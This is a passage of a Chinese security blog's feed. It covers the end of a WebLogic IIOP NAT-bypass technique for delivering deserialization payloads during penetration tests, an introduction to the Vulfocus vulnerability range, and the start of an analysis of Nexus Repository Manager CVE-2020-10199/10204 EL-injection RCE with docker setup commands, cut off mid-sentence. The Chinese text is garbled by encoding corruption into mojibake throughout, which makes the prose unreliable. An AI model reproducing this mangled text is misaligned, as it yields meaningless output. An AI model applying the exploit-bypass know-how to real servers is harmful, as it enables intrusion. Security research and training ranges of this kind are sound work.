å˜æˆäº†å†…ç½‘ä¸­çš„ IP å’Œç«¯å£ã€‚ </p><p><img src="https://img.zhiiyun.com/blog_737484703cca2fb90dae88ee20ad6b46" alt=""></p><p>åœ¨è¿›å…¥ <code>EndPointManager.findOrCreateEndPoint</code> æœ€ç»ˆä¼šæ‰§è¡Œåˆ° <code>createEndPoint</code> æ–¹æ³•ä¸­æ¥è¿›è¡Œå»ºç«‹ Socket é€šä¿¡ï¼Œåœ¨è¿™é‡Œç”±äºæ˜¯å†…ç½‘çš„ IP å’Œç«¯å£æ— æ³•æˆåŠŸå»ºç«‹é€šä¿¡ï¼Œå¯¼è‡´åç»­çš„åˆ©ç”¨ä¹Ÿæ— æ³•ç»§ç»­è¿›è¡Œã€‚</p><p><img src="https://img.zhiiyun.com/blog_b8be6dfae587544de34ac7d46e228750" alt=""></p><h4 id="å®ç°-2"><a href="#å®ç°-2" class="headerlink" title="å®ç°"></a>å®ç°</h4><p>å¤§è‡´çš„é—®é¢˜ç‚¹å·²ç»ç¡®è®¤çš„æ¸…æ¥šçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹åŸå§‹ä»£ç çš„æ–¹å¼æ¥è¿›è¡Œå®ç°ç»•è¿‡ï¼Œå¤§ä½“æ€è·¯ä¸ºï¼š</p><ol><li>ä¿®æ”¹ <code>weblogic.corba.j2ee.naming.ContextImpl</code> ç±»ä¸­çš„ <code>rebind</code> æ–¹æ³•</li><li>ä¿®æ”¹ <code>weblogic.iiop.IIOPRemoteRef</code> ç±»ä¸­ <code>locateIORForRequest</code> æ–¹æ³•çš„ ior å‚æ•°ï¼Œç¡®ä¿æ­£å¸¸è°ƒç”¨ <code>findOrCreateEndPoint</code>  åˆ›å»ºç»“æŸåˆ‡ç‚¹</li></ol><p>é¦–å…ˆä¿®æ”¹ <code>weblogic.corba.j2ee.naming.ContextImpl</code> ç±»ä¸­ <code>rebind</code> æ–¹æ³•å°†æ­£ç¡®çš„è¿æ¥ IP å’Œç«¯å£åŠ å…¥åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­ã€‚</p><p><img src="https://img.zhiiyun.com/blog_50ce3f44885fe18c85247fcad5a3deb4" alt=""></p><p>æœ€ååœ¨ <code>locateIORForRequest</code> æ–¹æ³•è¯»å–ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­æ­£ç¡®çš„ IP å’Œç«¯å£å¹¶ä¸”ä¿®æ”¹ <code>ior</code> å˜é‡ä¸­ç›¸å…³çš„è¿æ¥ä¿¡æ¯ã€‚ä½¿ä¹‹èƒ½å¤Ÿæ­£å¸¸çš„æ‰§è¡Œ <code>findOrCreatePoint</code> æ–¹æ³•åˆ›å»ºç»“æŸåˆ‡ç‚¹</p><p><img src="https://img.zhiiyun.com/blog_25d0789a9fd5906b2b720eab97b8fa0f" alt=""></p><p>æœ€ç»ˆæ•ˆæœï¼š</p><p><img src="https://img.zhiiyun.com/blog_7e41dc916766e530fd2163b14a18685a" alt=""></p><h2 id="IIOP-NAT-ç»•è¿‡æ–¹æ¡ˆæ€»ç»“"><a href="#IIOP-NAT-ç»•è¿‡æ–¹æ¡ˆæ€»ç»“" class="headerlink" title="IIOP NAT ç»•è¿‡æ–¹æ¡ˆæ€»ç»“"></a>IIOP NAT ç»•è¿‡æ–¹æ¡ˆæ€»ç»“</h2><ul><li>GIOP åè®®æç®€å®ç°<ul><li>ä¼˜ç‚¹ï¼šåŸå§‹ Socket å‘åŒ…ï¼Œæ•ˆç‡è¾ƒå¿«</li><li>ç¼ºç‚¹ï¼šæ„é€ éš¾åº¦è¾ƒé«˜ï¼Œéœ€è¦æŒæ¡åè®®ç›¸å…³çŸ¥è¯†</li></ul></li><li>Javassist<ul><li>ä¼˜ç‚¹ï¼šä¿®æ”¹éš¾åº¦è¾ƒä½</li><li>ç¼ºç‚¹ï¼šç¨‹åºä½¿ç”¨å®Œæ¯•ä¹‹åéœ€è¦é‡å¯ï¼Œå¦‚æœä½¿ç”¨åŠ¨æ€åŠ è½½ç­‰æ–¹æ¡ˆå¯èƒ½å¯¼è‡´èµ„æºå ç”¨ç‡è¿‡é«˜</li></ul></li><li>æºä»£ç ä¿®æ”¹<ul><li>ä¼˜ç‚¹ï¼šåŸç”Ÿä»£ç å…¼å®¹æ€§è¾ƒå¼º</li><li>ç¼ºç‚¹ï¼šä¿®æ”¹éš¾åº¦è¾ƒå¤§</li></ul></li></ul><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://blog.csdn.net/weixin_33913377/article/details/94134763" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33913377/article/details/94134763</a></li><li><a href="https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf" target="_blank" rel="noopener">https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf</a></li><li><a href="https://www.slideserve.com/milek/13-giop-iiop-ior" target="_blank" rel="noopener">https://www.slideserve.com/milek/13-giop-iiop-ior</a></li><li><a href="https://www.cnblogs.com/scy251147/p/11100961.html" target="_blank" rel="noopener">https://www.cnblogs.com/scy251147/p/11100961.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;é€šå¸¸åœ¨æ¸—é€çš„è¿‡ç¨‹ä¸­ä¼šé‡åˆ°å¾ˆå¤š Weblogic æœåŠ¡å™¨ï¼Œä½†é€šè¿‡ IIOP åè®®è¿›è¡Œå‘é€åºåˆ—åŒ–æ¶æ„ä»£ç åŒ…æ—¶ï¼Œä¼šé¢ä¸´ç€æ— æ³•å»ºç«‹é€šè®¯è¯·æ±‚å‘é€æ¶æ„åº
      
    
    </summary>
    
    
      <category term="weblogic" scheme="http://www.r4v3zn.com/tags/weblogic/"/>
    
      <category term="t3" scheme="http://www.r4v3zn.com/tags/t3/"/>
    
      <category term="iiop" scheme="http://www.r4v3zn.com/tags/iiop/"/>
    
      <category term="giop" scheme="http://www.r4v3zn.com/tags/giop/"/>
    
  </entry>
  
  <entry>
    <title>æ‰“â€œæ€ªâ€å‡çº§çš„é¶åœºâ€”â€”Vulfocus</title>
    <link href="http://www.r4v3zn.com/posts/b63356d0/"/>
    <id>http://www.r4v3zn.com/posts/b63356d0/</id>
    <published>2020-04-22T09:31:31.000Z</published>
    <updated>2020-11-11T08:06:56.260Z</updated>
    
    <content type="html"><![CDATA[<p>Vulfocus æ˜¯ä¸€ä¸ªæ¼æ´é›†æˆå¹³å°ï¼Œå°†æ¼æ´ç¯å¢ƒ docker é•œåƒï¼Œæ”¾å…¥å³å¯ä½¿ç”¨ï¼Œå¼€ç®±å³ç”¨ã€‚</p><p>åœ¨çº¿æ¼”ç¤ºï¼š<a href="http://vulfocus.fofa.so/" target="_blank" rel="noopener">http://vulfocus.fofa.so/</a></p><p>å¼€æºåœ°å€ï¼š<a href="https://github.com/fofapro/vulfocus" target="_blank" rel="noopener">https://github.com/fofapro/vulfocus</a></p><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æ¼æ´é¶åœºæ˜¯ç›®å‰æ¯ä¸ªå®‰å…¨äººå‘˜ä»¥åŠæƒ³å­¦ä¹ ä¿¡æ¯å®‰å…¨çš„äººå¿…å¤‡çš„ä¸œè¥¿ï¼Œä½†ç›®å‰å•†ä¸šåŒ–äº§å“å±…å¤šï¼Œè¿˜æœ‰ä¸€äº›ç±»ä¼¼ dvwaã€ sqli-labs è¿™ç±»çš„å¼€æºé¡¹ç›®ï¼Œä½†æ˜¯æ¼æ´ç¯å¢ƒæ¯”è¾ƒå›ºå®šï¼Œä½¿ç”¨å®Œä¸€æ¬¡åå°±å¤±å»å…¶ä½œç”¨ã€‚æ­å»ºçš„æˆæœ¬è¿‡é«˜ï¼Œæ¯æ¬¡å¯åŠ¨çš„æµç¨‹ä¼šæ¯”è¾ƒç¹çï¼Œç”šè‡³å¾ˆå¤šåœºæ™¯æ˜¯ä¸æ»¡è¶³çš„ï¼Œä¹‹å‰å…³äºæ¼æ´ç¯å¢ƒé•œåƒä½¿ç”¨å¤šçš„æ˜¯ vulhubï¼Œä½†æ˜¯ä½œä¸ºä¼ä¸šã€é«˜æ ¡ç­‰ä»¥åŠç›¸å…³çš„åŸ¹è®­ï¼Œå•çº¯çš„æ¼æ´ç¯å¢ƒä¸ä¸€å®šèƒ½æ»¡è¶³ä½¿ç”¨çš„éœ€æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬åŸºäºå½“ä¸‹çš„ä¸€äº›é¶åœºé¡¹ç›®åšå‡ºäº†å°å°çš„æ”¹è¿›æ¥ç¬¦åˆæˆ‘ä»¬çš„ä¸€äº›éœ€æ±‚ï¼Œæ¯”å¦‚å¢åŠ  flag çš„å½¢å¼ï¼Œæ¥æ»¡è¶³ä¸€äº›è€ƒæ ¸ä¸éªŒè¯çš„éœ€æ±‚ï¼Œå¯ä»¥å¯¹æˆ‘ä»¬å†…éƒ¨äººå‘˜èƒ½åŠ›è¿›è¡Œè€ƒæ ¸ï¼Œäºæ˜¯ Vulfocus å°±è¯ç”Ÿäº†ã€‚</p><h2 id="è®¤è¯†-Vulfocus"><a href="#è®¤è¯†-Vulfocus" class="headerlink" title="è®¤è¯† Vulfocus"></a>è®¤è¯† Vulfocus</h2><p>å› ä¸º Vulfocus ä¸€ä¸ªæ¼æ´é›†æˆå¹³å°ï¼Œæ‰€ä»¥å¯ä»¥æ— é™å‘é‡Œæ·»åŠ æ¼æ´ç¯å¢ƒæ²¡æœ‰é™åˆ¶ï¼Œå‰ææ˜¯ä½ çš„å†…å­˜è¶³å¤Ÿå¤§ã€‚å› ä¸ºæ¼æ´ç¯å¢ƒæ˜¯dockeré•œåƒçš„åŸå› æ¯æ¬¡é‡æ–°å¯åŠ¨æ¼æ´ç¯å¢ƒéƒ½ä¼šè¿˜åŸï¼Œä¸ç”¨å‡ºç°ä½ ä¼šå¯¹ç¯å¢ƒé€ æˆç ´åä¸‹æ¬¡æ— æ³•å¯åŠ¨çš„ç°è±¡ã€‚</p><p>Vulfocus çš„ docker ä»“åº“ <a href="https://hub.docker.com/u/vulfocus" target="_blank" rel="noopener">https://hub.docker.com/u/vulfocus</a></p><h3 id="Vulfocusçš„ç‰¹æ€§"><a href="#Vulfocusçš„ç‰¹æ€§" class="headerlink" title="Vulfocusçš„ç‰¹æ€§"></a>Vulfocusçš„ç‰¹æ€§</h3><ol><li>å¯åŠ¨ï¼šä¸€é”®æ¼æ´ç¯å¢ƒå¯åŠ¨ï¼Œæ–¹ä¾¿ç®€å•ã€‚</li><li>è‡ªå¸¦ Flag åŠŸèƒ½ï¼šæ¯æ¬¡å¯åŠ¨ flag éƒ½ä¼šè‡ªåŠ¨æ›´æ–°ï¼Œæ˜ç¡®æ¼æ´æ˜¯å¦åˆ©ç”¨æˆåŠŸã€‚</li><li>å¸¦æœ‰è®¡åˆ†åŠŸèƒ½ä¹Ÿå¯é€‚ç”¨äºç›¸å…³å®‰å…¨äººå‘˜èƒ½åŠ›çš„è€ƒæ ¸ã€‚</li><li>å…¼å®¹ <a href="https://vulhub.org/" target="_blank" rel="noopener">Vulhub</a>ã€<a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">Vulapps</a> ä¸­æ‰€æœ‰æ¼æ´é•œåƒã€‚</li></ol><h2 id="â¬‡ï¸-ä¸‹è½½åŠå®‰è£…"><a href="#â¬‡ï¸-ä¸‹è½½åŠå®‰è£…" class="headerlink" title="â¬‡ï¸ ä¸‹è½½åŠå®‰è£…"></a>â¬‡ï¸ ä¸‹è½½åŠå®‰è£…</h2><p>ğŸ  è¯·å‚è€ƒ <a href="https://github.com/fofapro/vulfocus/blob/master/INSTALL.md" target="_blank" rel="noopener">INSTALL.md</a> è¿›è¡Œå®‰è£…ã€‚</p><p>â¬‡ï¸ å‘è¡Œç‰ˆä¸‹è½½ <a href="https://github.com/fofapro/vulfocus/releases" target="_blank" rel="noopener">https://github.com/fofapro/vulfocus/releases</a>ã€‚</p><h3 id="âœ¨-ä½¿ç”¨"><a href="#âœ¨-ä½¿ç”¨" class="headerlink" title="âœ¨ ä½¿ç”¨"></a>âœ¨ ä½¿ç”¨</h3><p><img src="https://img.zhiiyun.com/blog_d4e074d30450fb086df48edab2d239c1" alt=""></p><ol><li><p>å®‰è£…å®Œæˆåï¼Œè®¿é—®80ç«¯å£</p></li><li><p>ç”¨è®¾ç½®å¥½çš„ç®¡ç†å‘˜è´¦æˆ·ç™»å½•</p></li><li><p>é¦–é¡µä¸ºæ¼æ´é›†æˆé¡µé¢ï¼Œåˆšå¼€å§‹æ˜¯æ²¡æœ‰æ¼æ´é•œåƒçš„éœ€è¦ä» <a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a> ç½‘ç«™æ‹‰å–é•œåƒï¼Œæˆ–è‡ªå·±ä»¥taråŒ…çš„å½¢å¼ä¸Šä¼ ã€‚</p><p>æ¼æ´é•œåƒçš„æ‹‰å–å’Œä¸Šä¼ ï¼ˆ<strong>éœ€ç®¡ç†å‘˜æƒé™</strong>ï¼‰ï¼š</p><p>(1)ã€åœ¨è¿›è¡Œç®¡ç†ä¸­ï¼Œæ·»åŠ åŠŸèƒ½</p></li></ol><p><img src="https://img.zhiiyun.com/blog_f3c1e39d7bfcfeb7579b827ad8e3f51e" alt=""></p><p><img src="https://img.zhiiyun.com/blog_e77038bb1bd20168265bb52345105204" alt=""></p><p>   (2)ã€åˆ†åˆ«å¡«å…¥æ¼æ´åç§°ã€é•œåƒã€rankã€æè¿°</p><ul><li>é•œåƒåˆåˆ†ä¸ºæ–‡ä»¶å’Œæ–‡æœ¬<ul><li>æ–‡æœ¬ï¼šæ˜¯ä» <a href="https://hub.docker.com/u/vulfocus" target="_blank" rel="noopener">https://hub.docker.com/u/vulfocus</a> å®˜ç½‘æ‹‰å–é•œåƒã€‚å†…å®¹ä¸ºå¦‚ï¼š <code>vulfocus/webmin-cve_2019_15107</code> ã€‚ </li><li>æ–‡ä»¶ï¼šæœ¬åœ°æ¼æ´é•œåƒæ‰“æˆtaråŒ…çš„å½¢å¼è¿›è¡Œä¸Šä¼ ã€‚</li></ul></li></ul><ol start="4"><li>ä¸‹è½½å®Œæˆåç‚¹å‡»å¯åŠ¨å³å¯ã€‚</li></ol><p><img src="https://img.zhiiyun.com/blog_441411c5d117b691ca3ab06caf993ca7" alt=""></p><ol start="5"><li>é•œåƒå¯åŠ¨åï¼Œä¼šåœ¨ç¯å¢ƒé‡Œå†™å…¥ä¸€ä¸ª flag ï¼ˆé»˜è®¤ flag ä¼šå†™å…¥ <strong>/tmp/</strong> ä¸‹ï¼‰ï¼Œè¯»å–åˆ° flag åå¡«å…¥ flag çª—å£ï¼Œé•œåƒä¼šè‡ªåŠ¨å…³é—­ï¼Œå¦‚éœ€é‡æ–°å¯åŠ¨ï¼Œéœ€å¼ºåˆ·ä¸€ä¸‹ï¼Œç„¶åå†æ¬¡ç‚¹å‡»å¯åŠ¨å³å¯ã€‚</li></ol><h2 id="ğŸ› è´¡çŒ®æ¼æ´é•œåƒ"><a href="#ğŸ› è´¡çŒ®æ¼æ´é•œåƒ" class="headerlink" title="ğŸ› è´¡çŒ®æ¼æ´é•œåƒ"></a>ğŸ› è´¡çŒ®æ¼æ´é•œåƒ</h2><p>åˆæœŸ Vulfocus çš„æ¼æ´é•œåƒä¼šè¾ƒå°‘ï¼Œå¯èƒ½æ— æ³•æ»¡è¶³ä½ çš„éœ€æ±‚ï¼Œæ‰€ä»¥éå¸¸æœŸæœ›å¤§å®¶æ¥ä¸€èµ·ç»´æŠ¤ Vulfocusï¼Œå½“ä½ å‘ç°ä½ çš„ä¸€äº›æ¼æ´ç¯å¢ƒåœ¨ Vulfocus ä¸­æ‰¾ä¸åˆ°æ—¶ï¼Œå¯ä»¥æäº¤ä¾›å¤§å®¶ä½¿ç”¨ã€‚ä¸€ä¸ªæœ‰é—®é¢˜çš„ç¯å¢ƒå¯èƒ½ä¼šå½±å“åˆ°ä½¿ç”¨è€…çš„æƒ…ç»ªã€‚å› æ­¤æˆ‘ä»¬å¯¹ç¤¾åŒºæäº¤çš„æ¼æ´ç¯å¢ƒä¼šè¿›è¡Œå®¡æ ¸ã€‚è´¡çŒ®è€…åœ¨æäº¤æ¼æ´ç¯å¢ƒçš„æ—¶å€™ï¼Œå¯æä¾›ç›¸åº”çš„å¤ç°å·¥å…·æˆ–æµç¨‹ï¼ŒåŠ é€Ÿç¯å¢ƒçš„å®¡æ ¸ã€‚</p><h3 id="æ–¹å¼"><a href="#æ–¹å¼" class="headerlink" title="æ–¹å¼"></a>æ–¹å¼</h3><ul><li>æäº¤ dockerfile</li><li>ä¹Ÿå¯ä»¥ä¸Šä¼ åˆ° <a href="https://hub.docker.com" target="_blank" rel="noopener">https://hub.docker.com</a> ï¼ŒæŠŠé•œåƒçš„åç§°æä¾›ç»™æˆ‘ä»¬ï¼Œé•œåƒåç§°çš„å‘½ä»¤è§„åˆ™å¦‚ï¼šæ¡†æ¶ï¼ˆCMSã€ç»„ä»¶ï¼‰-æ¼æ´ç¼–å·ï¼Œä¾‹å¦‚ï¼š<code>vulfocus/spring-cve_2017_8046</code></li></ul><ul><li>ä¾‹ï¼š<br>  vulfocus/webmin-cve_2019_15107<br>  vulfocus/spring-cve_2017_8046</li></ul><h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><ul><li><p>fork <a href="https://github.com/fofapro/vulfocus" target="_blank" rel="noopener">vulfocus</a> è‡³ä¸ªäººé¡¹ç›®ï¼Œç„¶å clone é¡¹ç›®ã€‚</p></li><li><p>æäº¤ dockerfile è‡³ <a href="https://github.com/fofapro/vulfocus/tree/master/images" target="_blank" rel="noopener">images</a> æ–‡ä»¶å¤¹ä¸­åˆ›å»ºæ¼æ´åç§°ï¼Œç„¶åå°† dockerfile æ”¾ç½®è¯¥ç›®å½•ä¸‹ï¼Œæœ€åå°†ç¯å¢ƒä¿¡æ¯æäº¤è‡³ <a href="https://github.com/fofapro/vulfocus/blob/master/images/README.md" target="_blank" rel="noopener"><code>images/README.md</code></a>ã€‚</p></li><li>è´¡çŒ®è€…ä»¥ PR çš„æ–¹å¼å‘ github Vulfocus ç¤¾åŒºä»“åº“å†…æäº¤ æ¼æ´ç¯å¢ƒï¼Œ æäº¤ä½ç½®: <a href="https://github.com/fofapro/vulfocus/dockerfile/" target="_blank" rel="noopener">https://github.com/fofapro/vulfocus/dockerfile/</a></li><li>æˆ‘ä»¬ä¼šæ ¹æ®æä¾›çš„ dockerfileï¼Œç¡®å®šé•œåƒç¯å¢ƒæ˜¯å¦å¯ç”¨ã€‚</li><li>å®¡æ ¸å®Œæˆåé•œåƒä¼šæ”¾è¿› <a href="https://hub.docker.com/u/vulfocus" target="_blank" rel="noopener">https://hub.docker.com/u/vulfocus</a> ä»“åº“ä¾›å¤§å®¶ä½¿ç”¨ã€‚</li></ul><h2 id="ğŸ“-è®¨è®ºåŒº"><a href="#ğŸ“-è®¨è®ºåŒº" class="headerlink" title="ğŸ“ è®¨è®ºåŒº"></a>ğŸ“ è®¨è®ºåŒº</h2><p>å¦‚æœ‰é—®é¢˜å¯ä»¥åœ¨ GitHub æ issue, ä¹Ÿå¯åœ¨ä¸‹æ–¹çš„è®¨è®ºç»„é‡Œ</p><p>GitHub issue: <a href="https://github.com/fofapro/vulfocus/issues" target="_blank" rel="noopener">https://github.com/fofapro/vulfocus/issues</a></p><p>å¾®ä¿¡ç¾¤: é€šè¿‡æ‰«æä»¥ä¸‹äºŒç»´ç åŠ å…¥å¹¶ä¸”å¤‡æ³¨ <code>ç”³è¯· Vulfocus</code> åŠ å…¥ Vulfocus å®˜æ–¹å¾®ä¿¡ç¾¤ã€‚</p><p><img src="https://img.zhiiyun.com/blog_044fa7c0dae09ab2d304df63330fd195" alt=""></p><h2 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h2><ul><li><a href="https://github.com/PanJiaChen/vue-element-admin" target="_blank" rel="noopener">Vue Element Admin</a></li><li><a href="https://vulhub.org/" target="_blank" rel="noopener">Vulhub</a></li></ul><h2 id="å£°æ˜"><a href="#å£°æ˜" class="headerlink" title="å£°æ˜"></a>å£°æ˜</h2><p>è¯¥é¡¹ç›®ä¼šæ”¶é›†äº†å½“ä¸‹æ¯”è¾ƒæµè¡Œçš„æ¼æ´ç¯å¢ƒï¼Œè‹¥æœ‰ä¾µæƒï¼Œè¯·è”ç³»æˆ‘ä»¬ï¼</p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>é•œåƒå¯åŠ¨åç«‹å³è®¿é—®åœ°å€å¤±è´¥ï¼Ÿ</p><ol><li>æ ¹æ®é•œåƒçš„å¤§å°ï¼Œå¯åŠ¨æ—¶é—´ä¼šæœ‰ä¸åŒçš„å»¶è¿Ÿï¼Œä¸€èˆ¬åœ¨å‡ ç§’ä»¥å†…ã€‚</li></ol><p>æäº¤å®Œ flag åä¼šæœ‰å¡ä½ï¼Ÿ</p><ol><li>åœ¨æäº¤å®Œæ­£ç¡®flagåï¼Œä¼šè¿›è¡Œé•œåƒå…³é—­çš„åŠ¨ä½œï¼Œæ‰€ä»¥ä¼šæœ‰å‡ ç§’çš„å»¶è¿Ÿã€‚</li></ol><p>æ‹‰å–é•œåƒæ—¶ä¸€ç›´å¡åœ¨å“ªé‡Œ</p><ol><li><p>ç”±äºç½‘ç»œå»¶è¿Ÿæˆ–é•œåƒå¤ªå¤§çš„åŸå› æ—¶é—´ä¼šé•¿ä¸€ç‚¹ã€‚</p></li><li><p>é•œåƒåç§°å¡«é”™ï¼Œä¹Ÿä¼šå¡åœ¨å“ªé‡Œï¼Œå»ºè®®å¼ºåˆ·ä¸€ä¸‹ã€‚</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Vulfocus æ˜¯ä¸€ä¸ªæ¼æ´é›†æˆå¹³å°ï¼Œå°†æ¼æ´ç¯å¢ƒ docker é•œåƒï¼Œæ”¾å…¥å³å¯ä½¿ç”¨ï¼Œå¼€ç®±å³ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨çº¿æ¼”ç¤ºï¼š&lt;a href=&quot;http://vulfocus.fofa.so/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://vulf
      
    
    </summary>
    
    
      <category term="é¶åœº" scheme="http://www.r4v3zn.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
      <category term="Vulfocus" scheme="http://www.r4v3zn.com/tags/Vulfocus/"/>
    
  </entry>
  
  <entry>
    <title>Nexus Repository Manager æ¼æ´åˆ†æ</title>
    <link href="http://www.r4v3zn.com/posts/f11ab8f9/"/>
    <id>http://www.r4v3zn.com/posts/f11ab8f9/</id>
    <published>2020-04-09T02:33:50.000Z</published>
    <updated>2020-11-11T08:06:56.173Z</updated>
    
    <content type="html"><![CDATA[<p>authorï¼šr4v3zn@ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é™¢</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>3 æœˆ 31 æ—¥ Nexus Repository Manager å®˜æ–¹å‘å¸ƒäº† <code>CVE-2020-10199</code> <code>CVE-2020-10204</code>  çš„æ¼æ´é€šå‘Šä¿¡æ¯ï¼Œä¸¤ä¸ªæ¼æ´å‡æ˜¯ç”± <a href="https://securitylab.github.com/" target="_blank" rel="noopener">Github Secutiry Lab</a> çš„æ˜¯ <a href="https://github.com/pwntester" target="_blank" rel="noopener">@pwntester</a> å‘ç°çš„ã€‚</p><p>Nexus Repository æ˜¯ä¸€ä¸ªå¼€æºçš„ä»“åº“ç®¡ç†ç³»ç»Ÿï¼Œåœ¨å®‰è£…ã€é…ç½®ã€ä½¿ç”¨ç®€å•çš„åŸºç¡€ä¸Šæä¾›äº†æ›´åŠ ä¸°å¯Œçš„åŠŸèƒ½ã€‚</p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p><code>CVE-2020-10199</code> å’Œ <code>CVE-2020-10204</code> ä¸»è¦æ˜¯ç”±äºå¯æ‰§è¡Œæ¶æ„ <code>ELè¡¨è¾¾å¼</code> å¯¼è‡´çš„ã€‚ </p><h3 id="CVE-2020-10199"><a href="#CVE-2020-10199" class="headerlink" title="CVE-2020-10199"></a>CVE-2020-10199</h3><p>è¯¥æ¼æ´çš„æœ€ç»ˆè§¦å‘æ˜¯é€šè¿‡ç»™ <code>HelperBean</code> çš„ <code>message</code> è¿›è¡Œ <code>ELè¡¨è¾¾å¼</code> æ³¨å…¥ã€‚</p><h4 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h4><p>Nexus Repository Manager 3.x OSS / Pro &lt;= 3.21.1</p><h3 id="CVE-2020-10204"><a href="#CVE-2020-10204" class="headerlink" title="CVE-2020-10204"></a>CVE-2020-10204</h3><p>æ¼æ´è§¦å‘çš„ä¸»è¦åŸå› æ˜¯åœ¨<br><code>org.sonatype.nexus.security.privilege.PrivilegesExistValidator</code> æˆ– <code>org.sonatype.nexus.security.role.RolesExistValidator</code> ç±»ä¸­ï¼Œä¼šå¯¹ä¸å­˜åœ¨çš„ <code>privilege</code> æˆ– <code>role</code> æŠ›å‡ºé”™è¯¯ï¼Œè€Œåœ¨é”™è¯¯ä¿¡æ¯æŠ›å‡ºçš„æ—¶å€™ï¼Œä¼šå­˜åœ¨ä¸€ä¸ª <code>ELè¡¨è¾¾å¼</code> çš„æ¸²æŸ“ï¼Œä¼šæå–å…¶ä¸­çš„elè¡¨è¾¾å¼å¹¶æ‰§è¡Œï¼Œä»è€Œé€ æˆ <code>ELè¡¨è¾¾å¼</code> æ³¨å…¥ã€‚</p><h4 id="å½±å“èŒƒå›´-1"><a href="#å½±å“èŒƒå›´-1" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h4><p>Nexus Repository Manager 3.x OSS / Pro &lt;= 3.21.1</p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>ä¸‹è½½ Docker é•œåƒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull sonatype/nexus3:3.21.1</span><br></pre></td></tr></table></figure><p>åˆ›å»º nexus æ•°æ®å­˜å‚¨ç›®å½•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /your-dir/nexus-data</span><br></pre></td></tr></table></figure><p>è¿è¡Œ Docker é•œåƒï¼Œå¹¶ä¸”å¼€å¯è°ƒè¯•ç«¯å£ï¼Œå…¶ä¸­ 8081 ä¸º web è®¿é—®ç«¯å£ï¼Œ5050 ç«¯å£ä¸ºè¿œç¨‹è°ƒè¯•ç«¯å£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --rm -p 8081:8081 -p 5050:5050 --name nexus -v /your-dir/nexus-data:/nexus-data -e INSTALL4J_ADD_VM_PARAMS=&quot;-Xms2g -Xmx2g -XX:MaxDirectMemorySize=3g  -Djava.util.prefs.userRoot=/nexus-data -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5050&quot; sonatype/nexus3:3.21.1</span><br></pre></td></tr></table></figure><p>ä¸‹è½½ Nexus æºç ï¼Œå¹¶ä¸”åˆ‡æ¢è‡³ <code>3.21.0-05</code> åˆ†æ”¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sonatype/nexus-public.git</span><br><span class="line">git checkout -b release-3.21.0-05 origin/release-3.21.0-05</span><br></pre></td></tr></table></figure><p>IDEA å¯¼å…¥é¡¹ç›®å¹¶ä¸”é…ç½®è¿œç¨‹è°ƒè¯•ä¿¡æ¯ï¼š</p><p><img src="https://img.zhiiyun.com/blog_0eb69cb49bda39663620b3006230942c" alt=""></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="CVE-2020-10199-1"><a href="#CVE-2020-10199-1" class="headerlink" title="CVE-2020-10199"></a>CVE-2020-10199</h3><p>è¯¥æ¼æ´ä¸»è¦æ˜¯å› ä¸º  <code>HelperBean</code> çš„ <code>message</code>  å¹¶åš ELè¡¨è¾¾å¼è¿‡æ»¤ï¼Œå¯¼è‡´å‡ºç° RCE æ¼æ´ã€‚æ ¹æ®ä½œè€…ä½œè€…æè¿°ï¼Œä½œè€…å‘ç°å¦‚æœå¯æ§çš„æ•°æ®è¿›å…¥åˆ° <code>createViolation</code> å‡½æ•°å°†ä¼šè°ƒç”¨ <code>buildConstraintViolationWithTemplate</code> æ‰§è¡ŒELè¡¨è¾¾å¼ï¼Œåœ¨ 